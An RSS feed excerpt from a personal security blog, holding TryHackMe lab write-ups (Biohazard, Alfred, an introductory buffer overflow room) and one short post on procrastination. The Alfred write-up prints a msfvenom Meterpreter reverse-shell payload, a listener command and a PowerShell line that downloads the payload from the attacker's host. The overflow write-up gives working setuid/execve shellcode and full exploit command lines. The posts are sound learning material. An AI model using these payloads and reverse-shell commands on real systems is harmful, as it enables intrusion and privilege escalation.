<h3 id="org22c3c26"><span class="section-number-3">4.4.</span> <a href="#org22c3c26">Crest 4</a></h3>
<div class="outline-text-3" id="text-4-4">
<p>
Base58 and hex (once again, the second being suggested by CyberChef
instantly):
</p>
<pre class="example" id="orgf50ad9d">
pZGVfZm9yZXZlcg==
</pre>
</div>
</div>
<div id="outline-container-org48ac914" class="outline-3">
<h3 id="org48ac914"><span class="section-number-3">4.5.</span> <a href="#org48ac914">The complete crest</a></h3>
<div class="outline-text-3" id="text-4-5">
<pre class="example" id="org5763f08">
RlRQIHVzZXI6IGh1bnRlciwgRlRQIHBhc3M6IHlvdV9jYW50X2hpZGVfZm9yZXZlcg==
</pre>

<p>
Simply decoding with base64 (== giving a solid clue :P) gives us the
username and password for the ftp server
</p>
<pre class="example" id="orgf4f4da7">
FTP user: hunter, FTP pass: you_cant_hide_forever
</pre>
</div>
</div>
</div>
<div id="outline-container-orgd1eb542" class="outline-2">
<h2 id="orgd1eb542"><span class="section-number-2">5.</span> <a href="#orgd1eb542">The Guard House (FTP)</a></h2>
<div class="outline-text-2" id="text-5">
<p>
At this point, I logged in, and got all of the readily available files
on my machine to check them:
</p>
<ul class="org-ul">
<li>3 jpg files named 00X-key.jpg</li>
<li>A gpg encrypted file</li>
<li>A file called important.txt</li>
</ul>
</div>
<div id="outline-container-org7b9bb4b" class="outline-3">
<h3 id="org7b9bb4b"><span class="section-number-3">5.1.</span> <a href="#org7b9bb4b">Important.txt</a></h3>
<div class="outline-text-3" id="text-5-1">
<p>
Reveals to us:
</p>
<ul class="org-ul">
<li><code>/hidden_closet</code> page, but with a lock (helmet lock again)</li>
<li>That the helmet flag will be inside of the gpg file (no sh** sherlock!)</li>
</ul>
</div>
</div>
<div id="outline-container-org0b09629" class="outline-3">
<h3 id="org0b09629"><span class="section-number-3">5.2.</span> <a href="#org0b09629">The JPG files</a></h3>
<div class="outline-text-3" id="text-5-2">
<p>
Using strings, we can see that, at least for key-003, there is a .txt
embedded in the picture.
</p>

<p>
After taking a closer look with <code>steghide</code>, all of these contain
information, and all of them are password encrypted!
</p>
</div>
<div id="outline-container-org42c77c2" class="outline-4">
<h4 id="org42c77c2"><span class="section-number-4">5.2.1.</span> <a href="#org42c77c2">Key 01:</a></h4>
<div class="outline-text-4" id="text-5-2-1">
<p>
No password, just pressed enter and it worked, got the data:P
</p>
<pre class="example" id="org9a62f04">
root@ip-10-10-86-188:~# steghide extract -sf 001-key.jpg
</pre>
</div>
</div>
<div id="outline-container-org9b900b0" class="outline-4">
<h4 id="org9b900b0"><span class="section-number-4">5.2.2.</span> <a href="#org9b900b0">Key 02:</a></h4>
<div class="outline-text-4" id="text-5-2-2">
<p>
Had a comment <code>5fYmVfZGVzdHJveV9</code>, revealed using <code>exiftool</code>, but was not
the key to extract.
</p>

<p>
(Post-completion: The  key was not necessary after all, only the
comment was enough.)
</p>
</div>
</div>
<div id="outline-container-orgaff36b3" class="outline-4">
<h4 id="orgaff36b3"><span class="section-number-4">5.2.3.</span> <a href="#orgaff36b3">Key 03:</a></h4>
<div class="outline-text-4" id="text-5-2-3">
<p>
<code>Exiftool</code> revealed a comment: &ldquo;compressed with jpeg-recompress&rdquo;, but
after searching a little bit about it, provided no actual info. Using
just another tool did the job, this time with <code>binwalk</code>:
</p>

<pre class="example" id="org43a34da">
3aXRoX3Zqb2x0
</pre>

<p>
Combining them together and decoding them with base64:
</p>
<pre class="example" id="org8dd7428">
plant42_can_be_destroy_with_vjolt
</pre>

<p>
Using this to decrypt our gpg encrypted text, and I no longer need to
run <code>john</code> (or <code>stegcracker</code>, because I <b>surely</b> could not have started both
of them on key2 and 3 respectively )on the background. (Yup, I thought
it might be worth a shot, since I could not find my steganography
notes at the beginning. )
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org9e97ed6" class="outline-2">
<h2 id="org9e97ed6"><span class="section-number-2">6.</span> <a href="#org9e97ed6">Going Back</a></h2>
<div class="outline-text-2" id="text-6">
</div>
<div id="outline-container-orgd9ceffd" class="outline-3">
<h3 id="orgd9ceffd"><span class="section-number-3">6.1.</span> <a href="#orgd9ceffd">Hidden Closet</a></h3>
<div class="outline-text-3" id="text-6-1">
<p>
After using the helmet password, we get to another room:
</p>
<ul class="org-ul">
<li>talk of a traitor</li>
<li><code>wpbwbxr wpkzg pltwnhro, txrks_xfqsxrd_bvv_fy_rvmexa_ajk</code></li>
<li>SSH password: <code>sorry for obfuscating this</code></li>
</ul>
</div>
</div>
<div id="outline-container-orgff025ef" class="outline-3">
<h3 id="orgff025ef"><span class="section-number-3">6.2.</span> <a href="#orgff025ef">Study Room</a></h3>
<div class="outline-text-3" id="text-6-2">
<ul class="org-ul">
<li>SSH user: umbrella<sub>guest</sub></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org73ccb13" class="outline-2">
<h2 id="org73ccb13"><span class="section-number-2">7.</span> <a href="#org73ccb13">SSH</a></h2>
<div class="outline-text-2" id="text-7">
<p>
Logging in, there does not seem to be a lot we can do right away:
</p>
<pre class="example" id="org7f1e179">
umbrella_guest@umbrella_corp:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
weasker:x:1000:1000:Biohazard,,,:/home/weasker:/bin/bash
umbrella_guest:x:1001:1001:umbrella,1,0,0,0:/home/umbrella_guest:/bin/bash
hunter:x:1002:1002:hunter,1,1,1,1:/home/hunter/FTP:/bin/bash
umbrella_guest@umbrella_corp:~$ 
</pre>
<ul class="org-ul">
<li>I can also login as hunter with the ftp password we found above.</li>
<li>Neither account is part of sudoers, no luck with sudo for us</li>
<li>Found a file (chris.txt) hidden in the home directory (<b>ALWAYS
REMEMBER TO LS -A</b>)
<ul class="org-ul">
<li>Contains the key to the string we found in the <a href="#orgd9ceffd">Hidden Closet</a>,
using Vigenere once again:</li>
</ul></li>
</ul>
<pre class="example" id="org8e636e7">
wpbwbxr wpkzg pltwnhro, txrks_xfqsxrd_bvv_fy_rvmexa_ajk
weasker login password  sadly obfuscating this as well
</pre>
</div>
<div id="outline-container-orgc2769d3" class="outline-3">
<h3 id="orgc2769d3"><span class="section-number-3">7.1.</span> <a href="#orgc2769d3">Weasker</a></h3>
<div class="outline-text-3" id="text-7-1">
<p>
Not only a <code>sudo</code> member, but can run <b>everything</b> without a password. We
got root. (It was almost unnecessary, but I ran <code>sudo su</code>, to avoid
using <code>sudo</code> on every command)
</p>
</div>
</div>
</div>
<div id="outline-container-org9e598da" class="outline-2">
<h2 id="org9e598da"><span class="section-number-2">8.</span> <a href="#org9e598da">Conclusion</a></h2>
<div class="outline-text-2" id="text-8">
<div class="tenor-gif-embed" data-postid="5104045" data-share-method="host" data-aspect-ratio="1.76423" data-width="100%"><a href="https://tenor.com/view/laugh-lol-chuckles-funny-gif-5104045">A Good Laugh GIF</a>from <a href="https://tenor.com/search/laugh-gifs">Laugh GIFs</a></div> <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
</div>
</div>
]]>
</description></item>
<item>
<title>Procrastination / Anxiety: A strange way of doing nothing</title>
<link>posts/20231123_procrastination_anxiety_a_strange_way_of_doing_nothing.html</link>
<pubDate>Thu, 23 Nov 2023 01:39:00 +0200</pubDate>
<guid>posts/20231123_procrastination_anxiety_a_strange_way_of_doing_nothing.html</guid>
<description>
<![CDATA[<p>
If someone pays attention at the time this article was written, it
will become even more evident that it is not just another day for me.
Neither is this just another article, because in it I have tried to
capture the essence of something that has been bothering me for quite
some time.
</p>

<p>
<b>Embarking on a task with the intention of mastering it is one thing; tackling it under the pressure of a deadline is an entirely different challenge.</b>
</p>

<p>
I had started working on a project for my university course on
Parallel and Distributed Systems, a subject I have come to
tremendously appreciate, when for personal (and as it happens academic
reasons), I got a little bit sidetracked. At that point, what I had
started working on with joy and satisfaction<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup> turned to be a
brand new source of stress and disappointment.
</p>

<p>
The strangest thing is not that I saw my efficiency drop, because at
the end of the day, this happens. (un)Fortunately, we are not, and
hopefully we will never be, machines, so our emotions can have a toll
on us. What troubles me the most is <b>not focusing on that specific
task (mentally) prevented me from doing anything else wholeheartedly</b>.
</p>

<p>
This, extremely short article, is for anyone that might find
themselves feeling that way: <b>If you can&rsquo;t avoid it, deal with it.</b>
It certainly does not seem as simple that moment, but in hindsight,
there is not much more to it. Maybe start by doing something you
prefer, but avoid staying inactive.
</p>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
I really wish that the greek word <b>meraki</b> was gradually accepted
into the English language. I would have loved using it in this
context, and I believe that the philosophy and calmness behind it is
something widely sought for. 
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>THM: Alfred</title>
<link>posts/20231130_thm_alfred.html</link>
<pubDate>Thu, 30 Nov 2023 14:34:00 +0200</pubDate>
<guid>posts/20231130_thm_alfred.html</guid>
<description>
<![CDATA[<div id="outline-container-org0e16578" class="outline-2">
<h2 id="org0e16578"><span class="section-number-2">1.</span> <a href="#org0e16578">Intro</a></h2>
<div class="outline-text-2" id="text-1">
<p>
This time, other than just populating <code>/etc/hosts</code> with <code>alfred.thm</code>, I
also ran the following, to help me use my <i>standardized</i> notes.
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org62614d6"><span class="org-builtin">echo</span> <span class="org-string">"export IP=alfred.thm"</span> &gt;&gt; ~/.bashrc
</pre>
</div>
</div>
</div>
<div id="outline-container-orgc9f7e3f" class="outline-2">
<h2 id="orgc9f7e3f"><span class="section-number-2">2.</span> <a href="#orgc9f7e3f">Reconnaissance</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Simple nmap scan to find our open tcp ports:
</p>
<div class="org-src-container">
<pre class="src src-bash">nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
</pre>
</div>

<p>
And this gives us:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> 80 (HTTP)</li>
<li class="off"><code>[&#xa0;]</code> 3389 (TCpwrapped) - Alfred</li>
<li class="off"><code>[&#xa0;]</code> 8080 (HTTP)</li>
</ul>
</div>
<div id="outline-container-org0f2232d" class="outline-3">
<h3 id="org0f2232d"><span class="section-number-3">2.1.</span> <a href="#org0f2232d">Web Analysis: Port 80 Web Server</a></h3>
<div class="outline-text-3" id="text-2-1">
<ul class="org-ul">
<li>Minimal starting web page, started gobuster while trying the usual
spots. Nothing of interest came up</li>
<li>Gobuster with big revealed nothing</li>
</ul>

<div class="org-src-container">
<pre class="src src-bash" id="org34804f2">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
</pre>
</div>
</div>
</div>
<div id="outline-container-org66afa66" class="outline-3">
<h3 id="org66afa66"><span class="section-number-3">2.2.</span> <a href="#org66afa66">Web Analysis: Port 8080 Web Server</a></h3>
<div class="outline-text-3" id="text-2-2">
<ul class="org-ul">
<li>Jenkins entry portal</li>
<li>Robots.txt disallows everything on root</li>
<li>The password is at this point unknown
<ul class="org-ul">
<li>I searched online for the default (and popular) credentials:
<ul class="org-ul">
<li>Admin:password (did not work)</li>
<li>Admin:admin (did not work)</li>
<li>some other combs</li>
<li>found the actual one</li>
</ul></li>
</ul></li>
</ul>

<div id="org304ebeb" class="figure">
<p><img src="posts/images/Reconnaissance/20231130_145031_screenshot.png" alt="20231130_145031_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Jenkins Entry portal</p>
</div>



<blockquote>
<p>
At this point I viewed another writeup, to see how they had solved
that step, since my solution was at best sketchy. Hydra bruteforce was
another, better way to go.
</p>
</blockquote>
</div>
</div>
</div>
<div id="outline-container-orgc7bcd7c" class="outline-2">
<h2 id="orgc7bcd7c"><span class="section-number-2">3.</span> <a href="#orgc7bcd7c">Using Alfred</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Since I already knew that Alfred is a CI/CD server, even though I had
never worked on it, it was relatively simple:
</p>
<ul class="org-ul">
<li><p>
I knew there had to be a way to build the projects, and sure enough
that action was <b>directly</b> modifiable.
</p></li>
</ul>

<div id="org4b4e7df" class="figure">
<p><img src="posts/images/Using_Alfred/20231201_231517_screenshot.png" alt="20231201_231517_screenshot.png">
</p>
</div>

<p>
At this point, it is obvious that we need to get initial foothold
through a reverse shell of some kind. I saw the room&rsquo;s suggestion of
uploading and then executing one there, but I first wanted to try it
my way.
</p>

<p>
Using <a href="https://www.revshells.com/">online rev shell generator</a>, I got a reverse shell, but it did
not exactly look beautiful. Python did not exist on the system, which
made me unable to use the now-standard, pty spawn methodology.
However, that did not stop me from getting the flag. Unlikeable is not unusable.
</p>
</div>
</div>
<div id="outline-container-org109f41e" class="outline-2">
<h2 id="org109f41e"><span class="section-number-2">4.</span> <a href="#org109f41e">Upgrading our shell</a></h2>
<div class="outline-text-2" id="text-4">
<p>
The room then suggests that we get a meterpreter shell, which I again,
trying to avoid the <i>walkthrough</i> character of it, did my way.
</p>
</div>
<div id="outline-container-org4d3bac7" class="outline-3">
<h3 id="org4d3bac7"><span class="section-number-3">4.1.</span> <a href="#org4d3bac7">MSFvenom</a></h3>
<div class="outline-text-3" id="text-4-1">
<p>
Just a simple meterpreter reverse shell:
</p>

<div class="org-src-container">
<pre class="src src-cmd" id="org43fb711">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.67.161 LPORT=6969 -f exe -o reverse.exe
</pre>
</div>
</div>
</div>
<div id="outline-container-org66de66c" class="outline-3">
<h3 id="org66de66c"><span class="section-number-3">4.2.</span> <a href="#org66de66c">Meterpreter listener</a></h3>
<div class="outline-text-3" id="text-4-2">
<p>
Get the listener up and running
</p>

<div class="org-src-container">
<pre class="src src-cmd" id="orgb9daa4b">msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.67.161; set lport 6969; exploit"
</pre>
</div>
</div>
</div>
<div id="outline-container-org1a48278" class="outline-3">
<h3 id="org1a48278"><span class="section-number-3">4.3.</span> <a href="#org1a48278">Downloading File</a></h3>
<div class="outline-text-3" id="text-4-3">
<p>
My experience with windows is quite limited and that&rsquo;s why I had to go
into a little bit more research to get this over with :(
</p>

<p>
Having found an interesting article in the <a href="http://blog.commandlinekungfu.com/2009/11/episode-70-tangled-web.html">Command Line Kung Fu</a>
blog, I started with the following
</p>
<div class="org-src-container">
<pre class="src src-cmd">powershell -c '(New-Object System.Net.WebClient).DownloadFile("http://10.10.67.161:8000/reverse.exe","c:\Users\bruce\reverse.exe")'
</pre>
</div>

<p>
But it did not work. Even though it did not return any error codes, I
could see in my simple python server that no requests had been made.
Evidently it did not need that many modifications to work, it is just
that I may have used a syntax that resembled way too much this
procedure in Linux.
</p>
</div>
</div>
</div>
<div id="outline-container-orgdd26063" class="outline-2">
<h2 id="orgdd26063"><span class="section-number-2">5.</span> <a href="#orgdd26063">Privilege escalation</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Sadly <code>getsystem</code> works perfectly, and we get <code>NT AUTHORITY\SYSTEM</code>,
without it being necessary to do anything.
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>My first (proper?) buffer overflow</title>
<link>posts/20231205_my_first_proper_buffer_overflow.html</link>
<pubDate>Tue, 05 Dec 2023 13:34:00 +0200</pubDate>
<guid>posts/20231205_my_first_proper_buffer_overflow.html</guid>
<description>
<![CDATA[<div id="outline-container-orgb930c26" class="outline-2">
<h2 id="orgb930c26"><span class="section-number-2">1.</span> <a href="#orgb930c26">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Everyone that works with computers has heard of the term buffer
overflow. It is not uncommon to cause such an unwanted behavior when
writing code yourself, over populating memory or performing prohibited
read/write operations. However, even though I understood what was
happening in a broader sense, I did not have any experience with
buffer overflows. Thankfully, my project on the Computer Network
Security course, reading on <a href="https://ieeexplore.ieee.org/document/6547101">this paper</a>, gave me &ldquo;a reason&rdquo; to try and
get into more depth. <sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
</p>

<p>
I saw a couple of videos, wrote more than my fair share of articles,
and dug into one or more websites, but in the end, when I tried
TryHackMe&rsquo;s Buffer Overflow room, I was stuck.
</p>
</div>
</div>
<div id="outline-container-orge5027cc" class="outline-2">
<h2 id="orge5027cc"><span class="section-number-2">2.</span> <a href="#orge5027cc">Criticism</a></h2>
<div class="outline-text-2" id="text-2">
<p>
I feel that this room could (and should) be improved. While it <b>does</b>
serve as an introduction to Buffer Overflow, it surely is not a
tutorial/walkthrough targeted towards beginners, implied by its &ldquo;easy&rdquo;
difficulty.
</p>

<p>
It was rather disheartening, to see myself get so stuck.
</p>
</div>
</div>
<div id="outline-container-org7b70492" class="outline-2">
<h2 id="org7b70492"><span class="section-number-2">3.</span> <a href="#org7b70492">Task 7</a></h2>
<div class="outline-text-2" id="text-3">
<p>
In this task we are asked to get <code>special</code>, instead of <code>normal</code> to
execute:
</p>
<div class="org-src-container">
<pre class="src src-c" id="orga6a9146"><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdlib.h&gt;</span>
<span class="org-preprocessor">#include</span> <span class="org-string">&lt;unistd.h&gt;</span>
<span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdio.h&gt;</span>

<span class="org-type">void</span> <span class="org-function-name">special</span>()
{
    printf(<span class="org-string">"this is the special function\n"</span>);
    printf(<span class="org-string">"you did this, friend!\n"</span>);
}

<span class="org-type">void</span> <span class="org-function-name">normal</span>()
{
    printf(<span class="org-string">"this is the normal function\n"</span>);
}

<span class="org-type">void</span> <span class="org-function-name">other</span>()
{
    printf(<span class="org-string">"why is this here?"</span>);
}

<span class="org-type">int</span> <span class="org-function-name">main</span>(<span class="org-type">int</span> <span class="org-variable-name">argc</span>, <span class="org-type">char</span> **<span class="org-variable-name">argv</span>)
{
    <span class="org-keyword">volatile</span> <span class="org-type">int</span> (*<span class="org-function-name">new_ptr</span>) () = normal;
    <span class="org-type">char</span> <span class="org-variable-name">buffer</span>[14];
    gets(buffer);
    new_ptr();
}
</pre>
</div>

<p>
Launching GDB:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org4f29415">gdb ./func-pointer
</pre>
</div>


<p>
I had not played around with gdb before, so I did not have any
ready-to-go set of notes available, and had to build my own from
scratch. 
</p>

<p>
To view the assembly commands and memory addresses for each function I
used the following:
</p>
<pre class="example" id="org07a0525">
disassemble main
disassemble special
disassemble normal
</pre>



<div id="orgf7271a2" class="figure">
<p><img src="posts/images/Task_7/20231205_142939_screenshot.png" alt="20231205_142939_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Interesting assembly commands and locations</p>
</div>

<p>
At this point, I knew that the two variables, pointer and buffer were
adjacent in memory, and since <code>gets()</code> is vulnerable to buffer
overflows, that means I could potentially use it to write to the <code>new_ptr</code>
</p>

<p>
I also knew that:
</p>
<ul class="org-ul">
<li><code>0x400582</code> is the address of normal</li>
<li><code>0x400567</code> is the address of special</li>
</ul>

<p>
Having seen a related LiveOverflow video (an old one that got me
thinking of how slowly experience builds up), I was aware of the
<code>define hook-stop</code> functionality to print specific parts of memory and
or registers at each break point, so all I had to do was set proper
breakpoints and fool around with the input.
</p>

<p>
In the end, I only needed one breakpoint, which I placed at position 2
in the image above: I just wanted to see the memory right before the
execution of the function <code>new_ptr</code> pointed to.
</p>

<p>
Then I started experimenting:
</p>
<ul class="org-ul">
<li><code>run</code></li>
<li>give input</li>
<li>see memory</li>
<li>repeat</li>
</ul>


<p>
It quickly become evident that I was writing in the highlighted area,
and wanted to change the contents of the &ldquo;circled&rdquo; one&rsquo;s:
</p>

<div id="org4c7f42e" class="figure">
<p><img src="posts/images/Task_7/20231205_143929_screenshot.png" alt="20231205_143929_screenshot.png">
</p>
<p><span class="figure-number">Figure 2: </span>Highlighting memory dump</p>
</div>

<p>
Unfortunately, I could not get the payload I had created to work
inside of gdb, not knowing how to get it to parse my input as hex: I
could see that I modified the target area (first payload), but the
second one could not work, to set it to its proper value (0x400567)
</p>

<pre class="example" id="org6d7985c">
AAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAA\x67\x05\x40\x00
</pre>


<div id="orgb304e6b" class="figure">
<p><img src="posts/images/Task_7/20231205_144132_screenshot.png" alt="20231205_144132_screenshot.png">
</p>
<p><span class="figure-number">Figure 3: </span>Setting <code>new_ptr</code> to all As</p>
</div>

<p>
To bypass this I relied on <code>echo</code>: 
</p>


<div id="orgcfc43f5" class="figure">
<p><img src="posts/images/Task_7/20231205_140516_screenshot.png" alt="20231205_140516_screenshot.png">
</p>
<p><span class="figure-number">Figure 4: </span>Solution</p>
</div>
</div>
</div>
<div id="outline-container-org0cb7bbc" class="outline-2">
<h2 id="org0cb7bbc"><span class="section-number-2">4.</span> <a href="#org0cb7bbc">Task 8</a></h2>
<div class="outline-text-2" id="text-4">
<div class="note" id="orgd1cb006">
<p>
This was the first buffer overflow I attempted that resulted in the
execution of a different program for Privilege Escalation. Mistakes
are undoubtedly plenty, and if you find any, please feel free to
correct me in the comments.
</p>

</div>

<div class="org-src-container">
<pre class="src src-c" id="org3a34c0b"><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdio.h&gt;</span>
<span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdlib.h&gt;</span>

<span class="org-type">void</span> <span class="org-function-name">copy_arg</span>(<span class="org-type">char</span> *<span class="org-variable-name">string</span>)
{
    <span class="org-type">char</span> <span class="org-variable-name">buffer</span>[140];
    strcpy(buffer, string);
    printf(<span class="org-string">"%s\n"</span>, buffer);
    <span class="org-keyword">return</span> 0;
}

<span class="org-type">int</span> <span class="org-function-name">main</span>(<span class="org-type">int</span> <span class="org-variable-name">argc</span>, <span class="org-type">char</span> **<span class="org-variable-name">argv</span>)
{
    printf(<span class="org-string">"Here's a program that echo's out your input\n"</span>);
    copy_arg(argv[1]);
}
</pre>
</div>

<p>
Keeping it short,  when a function ends, the return address - the
address from which the computer should continue - exists in memory.
One (not-so-innocent) user, might try to modify this, so that another
program executes, thus modifying the flow of the program.
</p>

<p>
Even though I suppose that this is not actual reverse engineering -
but focusing only on the buffer overflow part of the challenge: We
know the source code: The snippet above gives us 140 bytes to store
information, before it prints it to the command line. We could, and
this is the target of this task, populate <i>some</i> of these 140 bytes with
a shellcode (code to spawn a shell for us), and modify the return
address of the <code>copy_arg()</code> function, so that when it is finished, it
does not return to <code>main()</code> but executes our payload, residing inside of
the <code>buffer</code> variable.
</p>

<p>
In addition to those 140 bytes to populate, we should also add enough
contents to overwrite the return value of the function.
</p>


<blockquote>
<p>
Silly as it may seem, chatgpt does more than just a fine job helping
you revise assembly. It was fun analyzing where I should look at :P
</p>
</blockquote>



<div id="org8a9c734" class="figure">
<p><img src="posts/images/Task_8/20231205_234129_screenshot.png" alt="20231205_234129_screenshot.png">
</p>
<p><span class="figure-number">Figure 5: </span>Filling buffer with A&rsquo;s and checking the return address</p>
</div>

<p>
Through experimentation we can understand the following:
</p>
<ul class="org-ul">
<li>The highlighted one&rsquo;s (and the 0x41s in between) are our input</li>
<li>The address in the block is the return address - the command
following <code>copy_arg</code> in main</li>
</ul>

<p>
So while our input did its job of populating the buffer variable, it
needs to be improved to work for us:
</p>
<ul class="org-ul">
<li>Glancing at the picture we can see that the return address is found
152 bytes after the first &rsquo;A&rsquo; (0x41), and has a length of 4 bytes,
meaning that we are interested in the bytes 152-156.</li>
</ul>

<p>
After modifying our input string just a little bit, we <i>hope</i> to get the
return address &ldquo;populated&rdquo; with As.
</p>


<div id="org1e06b68" class="figure">
<p><img src="posts/images/Task_8/20231205_234916_screenshot.png" alt="20231205_234916_screenshot.png">
</p>
<p><span class="figure-number">Figure 6: </span>Overwritten return address</p>
</div>

<p>
The &rsquo;\x90&rsquo; string is the NOP (no operation) flag, and is extremely
useful when used as padding, because when assembly gets evaluated and
a NOP flag is encountered it is simply skipped (does not cause any errors) 
</p>

<p>
At this point, focusing on the buffer overflow and not on the
shellcode, I got the hex shellcode from a writeup to continue. (The
one in the room did not seem to work). This is 40 bytes.
</p>

<pre class="example" id="orga437f49">
\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
</pre>

<p>
Modifying our input string once again to include the shellcode and the
buffer&rsquo;s address as a return address (remember, NOP), we expect to get
a shell:
</p>
<ul class="org-ul">
<li>0x7fffffffe370 becomes:
<ul class="org-ul">
<li>&rsquo;\x70\xe3\xff\xff\xff\x7f&rsquo;</li>
<li>Appended to our &ldquo;payload&rdquo;</li>
</ul></li>
</ul>

<div class="org-src-container">
<pre class="src src-bash" id="org5c06423">/home/user1/overflow-3/buffer-overflow $(python -c <span class="org-string">"print ('\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x70\xe3\xff\xff\xff\x7f')"</span>)
</pre>
</div>
<ul class="org-ul">
<li>That did not work at first for me because of a peculiar floating
error. After inspecting my &ldquo;payload&rdquo; again and again I replaced the
second padding with As instead of NOPs. It then worked.</li>
</ul>


<p>
Getting a shell, though, is not enough, since we do not have
permission to view the file we want (we remain as the same user,
despite the suid bit). We want to change our shellcode to have a
<code>setuid()</code> statement in it:
</p>
<ul class="org-ul">
<li>This is cheating, but once again, I reused someone else&rsquo;s shellcode,
even though I knew about real and effective uids. It was out of
scope for &ldquo;my investigation&rdquo; to get the shellcode.</li>
</ul>

<div class="org-src-container">
<pre class="src src-bash">/home/user1/overflow-3/buffer-overflow $(python -c <span class="org-string">"print ('\x90'*86 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x70\xe3\xff\xff\xff\x7f')"</span>)
</pre>
</div>
</div>
</div>
<div id="outline-container-org169c11e" class="outline-2">
<h2 id="org169c11e"><span class="section-number-2">5.</span> <a href="#org169c11e">Task 9</a></h2>
<div class="outline-text-2" id="text-5">
<p>
This seems exactly the same as before. Let&rsquo;s see if we can tackle it quickly:
</p>
<div class="org-src-container">
<pre class="src src-c" id="orga28638c"><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdio.h&gt;</span>
<span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdlib.h&gt;</span>

<span class="org-type">void</span> <span class="org-function-name">concat_arg</span>(<span class="org-type">char</span> *<span class="org-variable-name">string</span>)
{
    <span class="org-type">char</span> <span class="org-variable-name">buffer</span>[154] = <span class="org-string">"doggo"</span>;
    strcat(buffer, string);
    printf(<span class="org-string">"new word is %s\n"</span>, buffer);
    <span class="org-keyword">return</span> 0;
}

<span class="org-type">int</span> <span class="org-function-name">main</span>(<span class="org-type">int</span> <span class="org-variable-name">argc</span>, <span class="org-type">char</span> **<span class="org-variable-name">argv</span>)
{
    concat_arg(argv[1]);
}
</pre>
</div>

<ul class="org-ul">
<li>doggo has 5 characters length, meaning that there are 149 more
characters left to fill buffer. After that, there will be a padding
and the return address.</li>
<li>Following the same methodology as before, I fired up <code>gdb</code>, set
<code>stop-hook</code> up and &#x2026;</li>
</ul>


<div id="orgd90fb9d" class="figure">
<p><img src="posts/images/Task_9/20231206_002813_screenshot.png" alt="20231206_002813_screenshot.png">
</p>
<p><span class="figure-number">Figure 7: </span>Started from the bottom now we here</p>
</div>

<p>
I then created the setuid payload once again, and proceeded to
modify the payload to fit in our example.
</p>
<pre class="example" id="orgd9b8279">
root@ip-10-10-80-64:~# pwn shellcraft -f d amd64.linux.setreuid 1003
\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
</pre>

<p>
Namely the changes (compared to task 8):
</p>
<ol class="org-ol">
<li>Different size - but we can still use the same payload:
<ul class="org-ul">
<li>Bytes 164-170 are of interest now</li>
<li>Our payload remains 54 bytes in length, so with a padding of 100
and 9 we should be fine.</li>
</ul></li>
<li>Different user id:
<ul class="org-ul">
<li>Already fixed in our setuid payload (went ahead and checked )</li>
</ul></li>
<li>Different address:
<ul class="org-ul">
<li>As shown in the image above:
<ul class="org-ul">
<li>0x7fffffffe3b0</li>
<li>0xb0e3ffffff7f</li>
<li>\xb0\xe3\xff\xff\xff\x7f</li>
</ul></li>
</ul></li>
</ol>
<div class="org-src-container">
<pre class="src src-bash">./buffer-overflow-2 $(python -c <span class="org-string">"print ('\x90'*99 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*10 + '\xb0\xe3\xff\xff\xff\x7f')"</span>)
</pre>
</div>

<p>
That should work but I&rsquo;m still getting segmentation fault. I suspect 
that my shell code address is somehow wrong. (Strangely, this somehow
worked after I modified the address to something closer to my
shellcode address in gdb - even though I had used an address pointing
to the preceding NOPs)
</p>
</div>
</div>
